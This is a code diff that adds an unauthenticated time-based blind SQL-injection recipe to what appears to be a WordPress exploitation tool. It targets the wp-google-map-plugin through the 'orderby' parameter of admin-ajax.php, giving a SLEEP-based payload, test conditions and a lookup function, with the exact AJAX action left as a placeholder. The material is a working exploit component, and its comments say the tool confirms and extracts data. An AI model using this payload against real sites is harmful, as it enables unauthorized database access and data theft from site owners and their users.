@@ -93,3 +93,36 @@ PRIVESC_RECIPES = [
 
 def find_privesc(plugin_slug):
     return [r for r in PRIVESC_RECIPES if r["plugin"] == plugin_slug]
+
+
+# ── unauthenticated SQL-injection recipes (wp_sqli confirms/extracts) ──────────
+# Success = proof that attacker SQL executed (a timing delta), NOT a shell. The
+# payload is an ORDER BY-context injection: {cond} gates a SLEEP({sleep}).
+SQLI_RECIPES = [
+    {
+        "plugin": "wp-google-map-plugin",
+        "cve": "CVE-2026-2580",
+        "affected": "<=4.9.1",
+        "kind": "time-blind",
+        "method": "GET",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        # The 'orderby' sink is the AJAX tabular/location listing
+        # (class.tabular.php). Wordfence/WPScan don't publish the exact nopriv
+        # action string; CONFIRM it against the installed plugin source, e.g.
+        #   grep -rn "wp_ajax_nopriv_" wp-content/plugins/wp-google-map-plugin/
+        #   grep -rn "orderby" .../class.tabular.php
+        # The value below is a placeholder to be replaced with the real action.
+        "params": {"action": "CONFIRM_nopriv_listing_action"},
+        "inject_param": "orderby",
+        "payload": "title,(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
+        "true_cond": "1=1",
+        "false_cond": "1=2",
+        "source": "registry",
+        "note": "Unauth time-based blind SQLi via orderby in the datatables "
+                "listing; confirm the admin-ajax action against plugin source.",
+    },
+]
+
+
+def find_sqli(plugin_slug):
+    return [r for r in SQLI_RECIPES if r["plugin"] == plugin_slug]
